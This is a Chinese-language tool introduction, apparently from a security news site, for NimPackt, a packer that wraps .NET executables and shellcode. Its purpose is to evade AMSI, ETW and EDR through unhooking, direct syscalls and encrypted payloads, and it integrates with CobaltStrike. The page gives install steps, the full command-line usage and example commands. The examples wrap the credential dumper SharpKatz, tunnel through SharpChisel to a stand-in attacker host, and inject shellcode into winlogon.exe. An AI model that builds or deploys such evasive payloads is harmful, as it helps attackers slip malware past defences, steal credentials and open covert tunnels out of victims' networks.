## 关于NimPackt

NimPackt是一款基于Nim命令式编程语言开发的强大工具，该工具同时具备汇编程序封装功能以及Shellcode加载功能。

NimPackt是针对.NET（C#）可执行程序的封装工具，而且还可以实现在Windows系统上执行Shellcode。该工具能够以自动化的形式在Nim源码文件中封装Payload，而这些Payload可以是原生C代码，这样可以增加检测和逆向分析的难度。

 **该工具主要使用了下列两种技术：**

> Execute-Assembly：重新封装一个.NET可执行文件并运行，可以选择需要使用的绕过技术，例如API解钩子、AMSI修复或金庸ETW等。
>
>
> Shinject：可以接收一个.bin源码文件和位置独立的Shellcode，并在本地或远程进程中执行。也可以选择使用直接系统调用来触发Shellcode执行、或修复API钩子以绕过EDR。

## 功能介绍

> 1、使用静态系统调用实现EDR绕过；
>
> 2、使用[
> _ShellyCoat_](https://github.com/slaeryan/AQUARMOURY/tree/master/Shellycoat)刷新NTDLL.dll来解除生成线程中的用户模式API钩子；
>
> 3、Windows事件跟踪（ETW）绕过；
>
> 4、反恶意软件扫描接口（AMSI）绕过；
>
> 5、使用随机密钥的AES加密Payload，以防止静态分析或指纹识别；
>
> 6、支持编译为exe或dll；
>
> 7、支持跨平台编译（Linux和Windows）；
>
> 8、与CobaltStrike整合以生成ezpz Payload；

## 工具安装

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/chvancooten/NimPackt-v1.git

注意：如果在使用Syscalls编译代码时遇到问题，请将你的GCC降级为v8.1.0。

### Linux

在Linux操作系统上，直接安装该工具所需的依赖包，然后使用Nimble包安装工具来安装依赖组件和Python库：

    
    
    sudo apt install -y python3 mingw-w64 nim
    
    pip3 install pycryptodome argparse
    
    nimble install winim nimcrypto

### Windows

点击【[ _这里_](https://nim-lang.org/install_windows.html)】下载Nim安装工具，确保安装好了mingw，并使用提供的finish.exe设置好正确的路径值。如果你没有安装Python
3的话，请配置好Python 3环境之后，使用下列命令安装好该工具所需的依赖组件：

    
    
    nimble install winim nimcrypto
    
    pip3 install pycryptodome argparse

### Docker安装

首先，我们需要在本地设备上安装并配置好Docker环境，然后确保在当前目录下输入Shellcode。接下来，按照下列方式在容器中开始代码编译：

    
    
    docker run --rm -v `pwd`:/usr/src/np -w /usr/src/np chvancooten/nimbuild python3 NimPackt.py -e shinject -i sc.bin

### CobaltStrike插件

如需安装CobaltStrike插件，请选择菜单栏中的“Cobalt Strike -> Script
Manager”，然后点击“Load”。确保从原始路径加载“.cna”文件：

![](https://image.3001.net/images/20220501/1651412412_626e8dbccefce0e26ea8d.png!small)

## 工具使用

    
    
    usage: NimPackt.py [-h] -e EXECUTIONMODE -i INPUTFILE [-a ARGUMENTS] [-na] [-ne] [-r]
    
                       [-t INJECTTARGET] [-E] [-o OUTPUTFILE] [-nu] [-ns] [-f FILETYPE] [-s] [-32] [-S]
    
                       [-d] [-v] [-V]
    
     
    
    required arguments:
    
      -e EXECUTIONMODE, --executionmode EXECUTIONMODE
    
                            Execution mode of the packer. Supports "execute-assembly" or "shinject"
    
      -i INPUTFILE, --inputfile INPUTFILE
    
                            C# .NET binary executable (.exe) or shellcode (.bin) to wrap
    
     
    
    execute-assembly arguments:
    
      -a ARGUMENTS, --arguments ARGUMENTS
    
                            Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-    
                            time arguments (default)
    
      -na, --nopatchamsi    Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)
    
      -ne, --nodisableetw   Do NOT disable Event Tracing for Windows (ETW)
    
     
    
    shinject arguments:
    
      -r, --remote          Inject shellcode into remote process (default false)
    
      -t INJECTTARGET, --target INJECTTARGET
    
                            Remote thread targeted for remote process injection
    
      -E, --existing        Remote inject into existing process rather than a newly spawned one (default
    
                            false, implies -r) (WARNING: VOLATILE)
    
     
    
    other arguments:
    
      -o OUTPUTFILE, --outfile OUTPUTFILE
    
                            Filename of the output file (e.g. "LegitBinary"). Specify WITHOUT extension
    
                            or path. This property will be stored in the output binary as the original
    
                            filename
    
      -nu, --nounhook       Do NOT unhook user-mode API hooks in the target process by loading a fresh
    
                            NTDLL.dll
    
      -ns, --nosyscalls     Do NOT use direct syscalls (Windows generation 7-10) instead of high-level
    
                            APIs to evade EDR
    
      -f FILETYPE, --filetype FILETYPE
    
                            Filetype to compile ("exe" or "dll", default: "exe")
    
      -s, --sleep           Sleep for approx. 30 seconds by calculating primes
    
      -32, --32bit          Compile in 32-bit mode (untested)
    
      -S, --showConsole     Show a console window with the app's output when running
    
      -d, --debug           Enable debug mode (retains .nim source file in output folder)
    
      -v, --verbose         Print debug messages of the wrapped binary at runtime
    
      -V, --version         show program's version number and exit

## 工具使用样例

# 封装SharpKatz 在运行时接收参数，绕过NTDLL钩子、AMSI和ETW，在运行时将Verbose消息打印至控制台：

    
    
    python3 ./NimPackt.py -e execute-assembly -i bins/SharpKatz-x64.exe -S -v

# 将Seatbelt使用定制参数封装为DLL文件：

    
    
    python3 ./NimPackt.py -f dll -e execute-assembly -i Seatbelt.exe -a "-group=all -outputfile=c:\users\public\downloads\sb.txt"

# 使用内置ChiselChief 连接字符串封装SharpChisel，在运行时隐藏应用程序窗口：

    
    
    python3 NimPackt.py -nu -na -ne -e execute-assembly -i bins/SharpChisel.exe -a 'client --keepalive 25s --max-retry-interval 25s https://chiselserver.evilwebsite.com R:10073:socks'

# 将原始Shellcode封装为DLL文件，并通过直接系统调用在本地线程中执行‘

# 使用“msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o
/tmp/calc.bin”命令生成Shellcode：

    
    
    python3 NimPackt.py -i calc.bin -e shinject -f dll

# 将Shellcode封装到新生成的计算器线程中：

    
    
    python3 NimPackt.py -i calc.bin -e shinject -t "calc.exe"

# 将Shellcode封装到现有Winlogon进程中，不实用直接系统调用或NTDLL钩子解除：

    
    
    python3 NimPackt.py -i calc.bin -e shinject -r -E -t "winlogon.exe" -nu -ns

## 工具测试结果

![](https://image.3001.net/images/20220501/1651412462_626e8deeef09b8d28e0d7.png!small)

## 许可证协议

本项目的开发与发布遵循[
_MIT_](https://github.com/chvancooten/NimPackt-v1/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **NimPackt：** 【[ _GitHub传送门_](https://github.com/chvancooten/NimPackt-v1)】

## 参考资料

> [
> _https://github.com/slaeryan/AQUARMOURY/tree/master/Shellycoat_](https://github.com/slaeryan/AQUARMOURY/tree/master/Shellycoat)
>
> [
> _https://github.com/Flangvik/SharpCollection_](https://github.com/Flangvik/SharpCollection)
>
> [ _https://nim-lang.org/install_windows.html_](https://nim-> lang.org/install_windows.html)
>
> [
> _https://hub.docker.com/r/chvancooten/nimbuild_](https://hub.docker.com/r/chvancooten/nimbuild)

